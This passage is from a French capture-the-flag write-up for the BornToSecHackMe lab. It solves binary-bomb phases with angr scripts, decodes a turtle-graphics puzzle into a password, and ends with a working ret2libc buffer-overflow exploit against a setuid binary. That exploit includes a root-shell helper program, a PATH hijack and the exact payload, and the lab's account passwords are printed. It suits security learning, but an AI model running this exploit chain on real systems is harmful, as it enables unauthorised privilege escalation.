0x08048cb6      push    eax        ; va_list arg_8h
0x08048cb7      call    func4
0x08048cbc      mov     esi, eax
0x08048cbe      add     esp, 0xfffffff4
0x08048cc1      lea     eax, [ebx - 2]
0x08048cc4      push    eax        ; va_list arg_8h
0x08048cc5      call    func4
0x08048cca      add     eax, esi
0x08048ccc      jmp     0x8048cd5
0x08048cce      mov     esi, esi
0x08048cd0      mov     eax, 1
0x08048cd5      lea     esp, [var_18h]
0x08048cd8      pop     ebx
0x08048cd9      pop     esi
0x08048cda      mov     esp, ebp
0x08048cdc      pop     ebp
0x08048cdd      ret
```

Même s'il est simple, le code de résolution est celui qui prend le plus de temps à l'exécution, certainement à cause de la récursivité :

```python
def solve_flag_4():                                                                                                    
    start = 0x08048d03                                                                                                 
    end = 0x08048d2a                                                                                                   
    project = angr.Project(BINARY, auto_load_libs=False)                                                               
    initial_state = project.factory.blank_state(addr=start)                                                            
    int1 = initial_state.solver.BVS("int1", 8*4)                                                                       
    initial_state.memory.store(initial_state.regs.ebp - 0x4, int1, endness='Iend_BE')                                  
    sm = project.factory.simulation_manager(initial_state)                                                             
    sm.explore(find=end, avoid=0x080494fc)                                                                             
    solution_state = sm.found[0]                                                                                       
    print(unpack("<I", solution_state.solver.eval(int1, cast_to=bytes))[0])
```

La solution est simplement `9`.

## Boom! Shake The Room

La 5ème étape lit une chaine de caractère. Si elle ne fait pas 6 caractères la bombe explose. Une transformation est appliquée à la chaine puis le résultat est comparé à la chaine `giants`.

C'est l'étape qui m'a donné le plus de difficultés, le programme retournant des données invalides (faisait exploser la bmbe). Finalement ici j'ai utilisé un `call_state` au lieu d'un `blank_state`.

`call_state` permet de définir un état comme si on appelait directement la fonction. L'avantage c'est qu'on peut directement lui passer en paramètre la valeur symbolique que l'on a déclaré.

```python
def solve_flag_5():
    start = 0x08048d2c  # beginning of function, on "push ebp" instruction
    end = 0x08048d94 # end of function on "ret" instruction

    project = angr.Project(BINARY, auto_load_libs=False)
    # Hooking some function we know the behavior should fasten things a bit                                            
    project.hook(0x08049018, angr.SIM_PROCEDURES["libc"]["strlen"]())                                                  
    project.hook(0x08049030, angr.SIM_PROCEDURES["libc"]["strcmp"]())                                                  
    # We need a 6 chars string but let's say 7 and put a null byte at the end                                          
    secret = claripy.BVS("secret", 8*7)                                                                                
    initial_state = project.factory.call_state(                                                                        
            start,                                                                                                     
            angr.PointerWrapper(secret, buffer=True),                                                                  
    )

    # Let's add some constraints to our input string                                                                   
    # Chars should be lowercase
    for i in range(6):                                                                                                 
        c = secret.get_byte(i)                                                                                         
        initial_state.add_constraints(initial_state.solver.And(c >= ord("a"), c <= ord("z")))                          
                                                                                                                       
    # null byte                                                                                                        
    c = secret.get_byte(6)                                                                                             
    initial_state.add_constraints(c == 0)

    sm = project.factory.simulation_manager(initial_state)
    sm.explore(find=end, avoid=0x080494fc)
    found_state = sm.found[0]
    print(found_state.solver.eval(secret, cast_to=bytes).decode().strip())
```

Ici j'ai du importer `claripy` pour déclarer la variable `secret` car à ce stade le `initial_state` n'était pas déclaré.

Je hook aussi deux fonctions du binaire dont je sais qu'elles ne sont que des recopies de `strlen` et `strcmp`. Ces hooks sont destinés à réduire le temps d'exécution d'`angr`.

Avant de lancer la recherche avec la fonction `explore` je spécifie sur l'état initial des contraintes pour la chaine à trouver : les 6 caractères doivent être des lettres minuscules et elle doit se terminer par un octet nul.

L'exécution est rapide :

```shellsession
$ python defuse.py 
WARNING  | 2022-11-28 22:25:29,871 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
WARNING  | 2022-11-28 22:25:29,873 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
WARNING  | 2022-11-28 22:25:29,881 | angr.calling_conventions | Guessing call prototype. Please specify prototype.
opekma
```

## Spanish Bombs

La dernière fonction lit 6 entiers sur l'entrée standard.  Il y a de multiples boucles à l'intérieur, certaines imbriquées. La fonction `explode_bomb` peut être appelée à trois endroits différents.

Dans le code `angr` suivant j'exploite des fonctionalités supplémentaires. Déjà le loader permet de trouver l'adresse d'une fonction via son nom (car l'exécutable n'est pas strippé). Deuxièmement je hooke la fonction de lecture des 6 entiers pour quelle retourne directement mes 6 valeurs symboliques. La fonction `run` ci-dessous met en mémoire les 6 valeurs et retourne 6 car la vrai fonction doit retourner le nombre d'entiers reçus.

```python
class read_six_numbers_hook(angr.SimProcedure):                                                                        
    answer_ints = []  # class variable                                                                                 
    int_addrs = []                                                                                                     
                                                                                                                       
    def run(self, __, int_addr):                                                                                       
        self.int_addrs.append(int_addr)                                                                                
        for i in range(6):                                                                                             
            bvs = self.state.solver.BVS("phase6_int_%d" % i, 32)                                                       
            self.answer_ints.append(bvs)                                                                               
            self.state.mem[int_addr].int.array(6)[i] = bvs                                                             
                                                                                                                       
        return 6                                                                                                       
                                                                                                                       
                                                                                                                       
def solve_flag_6():                                                                                                    
    project = angr.Project(BINARY, auto_load_libs=False)                                                               
    project.analyses.CFG()                                                                                             
                                                                                                                       
    phase_6 = project.loader.find_symbol("phase_6").rebased_addr                                                       
    read_six_numbers = project.loader.find_symbol("read_six_numbers").rebased_addr                                     
    project.hook(read_six_numbers, read_six_numbers_hook())                                                            
    initial_state = project.factory.blank_state(addr=phase_6)                                                          
                                                                                                                       
    sm = project.factory.simulation_manager(initial_state)
    # Cherche à atteindre la dernière instruction de la fonction sans exploser
    sm.explore(find=0x08048e90, avoid=is_exploded)                                                                     
    found_state = sm.found[0]                                                                                          
    answer = [found_state.solver.eval(x) for x in read_six_numbers_hook.answer_ints]                                   
    print(' '.join(map(str, answer)))
```

Résultat :

```shellsession
python defuse.py 
WARNING  | 2022-11-28 22:44:29,571 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
WARNING  | 2022-11-28 22:44:29,574 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
4 2 6 3 1 5
```

## Démineur

On final ça se passe comme ça :

```shellsession
$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekma
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```

Et le mot de passe est donc `Publicspeakingisveryeasy.126241207201b2149opekmq426315`.

On peut normalement se connecter avec ce mot de passe en tant que `thor` sauf qu'il faut en fait échanger l'avant dernier et l'avant-avant dernier caractère (du coup la fin doit être `426135`).

C'est le genre de petite erreur qui peut transformer un CTF en une situation impossible, heureusement j'ai trouvé l'astude sur [un autre writeup](https://github.com/fhenri42/boot2root/blob/master/writeup1.md).

Petite parenthèse à propos du CTF : quand j'ai résolu cette épreuve je me suis principalement basé sur des codes d'exemples d'`angr`. On peut en trouver ici : [GitHub - jakespringer/angr_ctf](https://github.com/jakespringer/angr_ctf) et là : [angr-doc/examples](https://github.com/angr/angr-doc/tree/master/examples).

L'un des exemples concerne un CTF de l'Université de `Carnegie Mellon` et le binaire est quasi identique à celui de ce CTF (voir la solution [ici](https://github.com/angr/angr-doc/blob/master/examples/cmu_binary_bomb/solve.py)). Le CTF du `CMU` a aussi été résolu à l'aide d'angr par [un élève de l'université](https://fanpu.io/2020/07/30/breaking-cmu-bomblab-with-angr-for-fun-and-profit-part-1/).

Quand on voit [les solutions pour le binaire du CMU](https://redpwn.net/writeups/crackmes/cmu_binary_bomb/) on comprend que le code du `CMU` a juste été copié et légèrement modifié... dommage.

## Timmy The Turtle

Une fois connecté avec l'utilisateur `thor` on remarque une fois de plus qu'il n'est pas membre de groupes intéressants et qu'il dispose de deux fichiers dans on home :

```shellsession
thor@BornToSecHackMe:~$ cat README 
Finish this challenge and use the result as password for 'zaz' user.
thor@BornToSecHackMe:~$ head -5 turtle 
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
```

Le langage Tortue (ou [Logo](https://fr.wikipedia.org/wiki/Logo_(langage))) est un langage bien connu des débutants en programmation. Il permet aussi d'initier les enfants au développement.

Ici on a 1471 de langage Tortue francisé.

J'ai écrit le script suivant pour la traduction. Quand on rencontre une ligne vide on attend 2 secondes puis on efface l'écran :

```python
import re

ROTATE = re.compile(r"Tourne (gauche|droite) de (\d+) degrees")
FORWARD = re.compile(r"Avance (\d+) spaces")
BACKWARD = re.compile(r"Recule (\d+) spaces")

with open("turtle") as fd:
    for line in fd:
        if not line.strip():
            print("wait 120")
            print("clean")

        search = ROTATE.search(line)
        if search:
            direction, angle = search.groups()
            if direction == "gauche":
                print(f"lt {angle}")
            else:
                print(f"rt {angle}")
            continue

        search = FORWARD.search(line)
        if search:
            print(f"fd {search.group(1)}")
            continue

        search = BACKWARD.search(line)
        if search:
            print(f"bk {search.group(1)}")
            continue
```

J'ai balancé le résultat sur https://inexorabletash.github.io/jslogo/ et ça affiche les lettres `SLASH`. Le mot de passe n'est pas utilisable tel quel pour le compte `zaz`, il faut le hasher en MD5 ce qui donne `646da671ca01bb5d84dbb5fb2238dc8e`. Là encore c'est un point non mentionné mais qui fait toute la différence.

## Overflooooooooooooooooooooooow

Cette fois ça y est, on est sur le boss final :

```
-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
```

On a donc ce binaire setuid, non strippé et qui ne semble rien faire de plus qu'un `strcpy` et un `puts`.

```shellsession
zaz@BornToSecHackMe:~$ ./exploit_me toto
toto
zaz@BornToSecHackMe:~$ ./exploit_me totoooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
totoooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
Segmentation fault (core dumped)
```

Petit coup d'oeil à l'output de `dmesg` :

`[48067.977397] exploit_me[4634]: segfault at 6f6f6f6f ip 6f6f6f6f sp bffff6d0 error 14`

On a donc le controle sur le pointeur d'instruction. On peut jouer directement avec `dmesg` et on en conclut après quelques essais qu'il faut 140 caractères avant d'entamer l'adresse de retour.

La présence d'un 0 dans le fichier `/proc/sys/kernel/randomize_va_space` indique que l'ASLR n'est pas activé sur la VM. On a récupérer l'adresse de `system()`, trouver une chaine de caractères (n'importe laquelle) qui permettra de spécifier une commande à exécuter et ça devrait faire l'affaire :

```nasm
zaz@BornToSecHackMe:~$ gdb -q ./exploit_me 
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x080483f4 <+0>:     push   %ebp
   0x080483f5 <+1>:     mov    %esp,%ebp
   0x080483f7 <+3>:     and    $0xfffffff0,%esp
   0x080483fa <+6>:     sub    $0x90,%esp
   0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:    jg     0x804840d <main+25>
   0x08048406 <+18>:    mov    $0x1,%eax
   0x0804840b <+23>:    jmp    0x8048436 <main+66>
   0x0804840d <+25>:    mov    0xc(%ebp),%eax
   0x08048410 <+28>:    add    $0x4,%eax
   0x08048413 <+31>:    mov    (%eax),%eax
   0x08048415 <+33>:    mov    %eax,0x4(%esp)
   0x08048419 <+37>:    lea    0x10(%esp),%eax
   0x0804841d <+41>:    mov    %eax,(%esp)
   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:    lea    0x10(%esp),%eax
   0x08048429 <+53>:    mov    %eax,(%esp)
   0x0804842c <+56>:    call   0x8048310 <puts@plt>
   0x08048431 <+61>:    mov    $0x0,%eax
   0x08048436 <+66>:    leave  
   0x08048437 <+67>:    ret    
End of assembler dump.
(gdb) b *main
Breakpoint 1 at 0x80483f4
(gdb) r
Starting program: /home/zaz/exploit_me 

Breakpoint 1, 0x080483f4 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) info proc mappings
process 4813
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) x/25s  0x8049000
0x8049000:       "\177ELF\001\001\001"
0x8049008:       ""
0x8049009:       ""
0x804900a:       ""
0x804900b:       ""
0x804900c:       ""
0x804900d:       ""
0x804900e:       ""
0x804900f:       ""
0x8049010:       "\002"
0x8049012:       "\003"
0x8049014:       "\001"
0x8049016:       ""
0x8049017:       ""
0x8049018:       "@\203\004\b4"
0x804901e:       ""
0x804901f:       ""
0x8049020:       "4\b"
0x8049023:       ""
0x8049024:       ""
0x8049025:       ""
0x8049026:       ""
0x8049027:       ""
0x8049028:       "4"
0x804902a:       " "
```

Il y a le caractère `4` tout seul à la fin, il fera bien l'affaire :)

J'ai d'abord compilé ce programme sous le nom `4` :

```c
#include <unistd.h>
#include <stdlib.h>

int main(void) {
  setreuid(0, 0);
  setregid(0, 0);
  system("/bin/bash");
  return 0;
}
```

J'ajoute le dossier courant dans le path et on exploite :

```shellsession
zaz@BornToSecHackMe:~$ export PATH=.:$PATH
zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "A"*140 + "\x60\xb0\xe6\xb7\x28\x90\x04\x08\x28\x90\x04\x08"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���((�
root@BornToSecHackMe:~# id
uid=0(root) gid=0(root) groups=0(root),1005(zaz)
root@BornToSecHackMe:~# cat /root/README
CONGRATULATIONS !!!!
To be continued...
```

Après les 140 caractères se trouvent l'adresse de `system()` (qui écrase l'adresse de retour), du junk puis l'adresse de notre chaine.

## Et voilà

C'était très intéressant de pouvoir utiliser `angr` :) Le CTF est plutôt bien lui aussi mais les indications manquantes, les erratas et les solutions multiples laissent à désirer.
